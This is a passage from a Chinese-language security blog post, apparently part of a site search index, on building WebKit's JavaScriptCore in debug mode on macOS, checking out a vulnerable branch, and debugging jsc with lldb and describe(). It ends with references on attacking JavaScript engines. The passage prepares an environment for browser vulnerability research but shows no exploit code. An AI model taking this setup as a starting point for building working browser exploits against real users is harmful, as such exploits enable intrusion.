LD_LIBRARY_PATH=./lib bin/jsc</code></pre><p>我说一下在MacOS的build流程。首先确保安装了Xcode和Xcode的命令行工具。</p><pre><code class="bash">#我的系统版本 macOS Mojave$ sw_versProductName:    Mac OS XProductVersion:    10.14.6BuildVersion:    18G84$ git clone git://git.webkit.org/WebKit.git WebKit#这个说明已经安装好了$ xcode-select --installxcode-select: error: command line tools are already installed, use &quot;Software Update&quot; to install updates#确定Xcode路径是否正确$ xcode-select -p/Applications/Xcode.app/Contents/Developer#Xcode路径和上面不一样的，可以是用如下命令切换$ sudo xcode-select --s /Applications/Xcode.app/Contents/Developer$ xcodebuild -versionXcode 10.3Build version 10G8#编译之前确定切换到漏洞分支$ git checkout ...#到WebKit根目录下执行这个指令就可以了$ Tools/Scripts/build-webkit --jsc-only --debug</code></pre><p>我可能运气比较好，到这里都没出现过什么问题。直接可以运行JSC的<em>REPL</em>(Read Eval Print Loop)。</p><pre><code class="shell">$ WebKitBuild/Debug/bin/jsc&gt;&gt;&gt; a = 11&gt;&gt;&gt;</code></pre><p>如果遇到<code>DYLD_FRAMEWORK_PATH</code>路径的问题可以手动设置一下环境变量：</p><pre><code class="shell">#补全为绝对路径就行了export DYLD_FRAMEWORK_PATH=.../WebKitBuild/Debug</code></pre><p>调试器我用的lldb，对比gdb的指令可以很快上手：<a href="https://lldb.llvm.org/use/map.html" target="_blank" rel="noopener">GDB to LLDB command map</a></p><h3 id="0x03-开始调试"><a href="#0x03-开始调试" class="headerlink" title="0x03 开始调试"></a>0x03 开始调试</h3><p>可以直接用lldb载入jsc：</p><pre><code class="bash">$ lldb ./WebKitBuild/Debug/bin/jsc(lldb) target create &quot;./WebKitBuild/Debug/bin/jsc&quot;Current executable set to &#39;./WebKitBuild/Debug/bin/jsc&#39; (x86_64).(lldb) runProcess 39132 launched: &#39;/Users/7o8v/Documents/SecResearch/Browser/WebKit/WebKit.git/WebKitBuild/Debug/bin/jsc&#39; (x86_64)&gt;&gt;&gt;</code></pre><p>调试过程中可以配合JSC提供的调试函数进行调试，比如<code>describe()</code>：</p><pre><code class="bash">&gt;&gt;&gt; a = [1,2,3]1,2,3&gt;&gt;&gt; describe(a)Object: 0x108ab4340 with butterfly 0x8000e4008 (Structure 0x108af2a00:[Array, {}, ArrayWithInt32, Proto:0x108ac80a0, Leaf]), StructureID: 97&gt;&gt;&gt; a[3] = 1.11.1&gt;&gt;&gt; describe(a)Object: 0x108ab4340 with butterfly 0x8000e4008 (Structure 0x108af2a70:[Array, {}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 98&gt;&gt;&gt; a[4] = {}[object Object]&gt;&gt;&gt; describe(a)Object: 0x108ab4340 with butterfly 0x8000e4008 (Structure 0x108af2ae0:[Array, {}, ArrayWithContiguous, Proto:0x108ac80a0]), StructureID: 99&gt;&gt;&gt;</code></pre><p>更多的调试技巧可以看这篇文章：<a href="http://dwfault-blog.imwork.net:30916/2019/01/03/WebKit%20JavaScriptCore%E7%9A%84%E7%89%B9%E6%AE%8A%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">WebKit JavaScriptCore的特殊调试技巧</a></p><p>过程中也可以使用<code>Ctrl+C</code>中断，然后使用lldb命令。</p><p>也可以载入JSC之后，运行脚本文件：</p><pre><code class="bash">$ lldb ./WebKitBuild/Debug/bin/jsc(lldb) target create &quot;./WebKitBuild/Debug/bin/jsc&quot;Current executable set to &#39;./WebKitBuild/Debug/bin/jsc&#39; (x86_64).(lldb) run -i ./poc.jsProcess 39152 launched: ...&gt;&gt;&gt;</code></pre><h3 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h3><p>[1] <a href="https://github.com/m1ghtym0/browser-pwn#safari-webkit" target="_blank" rel="noopener">https://github.com/m1ghtym0/browser-pwn#safari-webkit</a></p><p>[2] <a href="https://webkit.org/blog/6756/es6-feature-complete/" target="_blank" rel="noopener">https://webkit.org/blog/6756/es6-feature-complete/</a></p><p>[3] <a href="https://mathiasbynens.be/notes/shapes-ics" target="_blank" rel="noopener">https://mathiasbynens.be/notes/shapes-ics</a></p><p>[4] <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Working_with_Objects" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Working_with_Objects</a></p><p>[5] <a href="https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/" target="_blank" rel="noopener">https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/</a></p><p>[6] <a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">http://phrack.org/papers/attacking_javascript_engines.html</a></p><p>[7] <a href="http://dwfault-blog.imwork.net:30916/2019/01/03/WebKit%20JavaScriptCore%E7%9A%84%E7%89%B9%E6%AE%8A%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">http://dwfault-blog.imwork.net:30916/2019/01/03/WebKit%20JavaScriptCore%E7%9A%84%E7%89%B9%E6%AE%8A%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/</a></p><p>[8] <a href="https://webkit.org/blog/7846/concurrent-javascript-it-can-work/" target="_blank" rel="noopener">https://webkit.org/blog/7846/concurrent-javascript-it-can-work/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Browser </tag>
            
            <tag> JavascriptEngine </tag>
            
            <tag> JavascriptCore </tag>
            
            <tag> Webkit </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
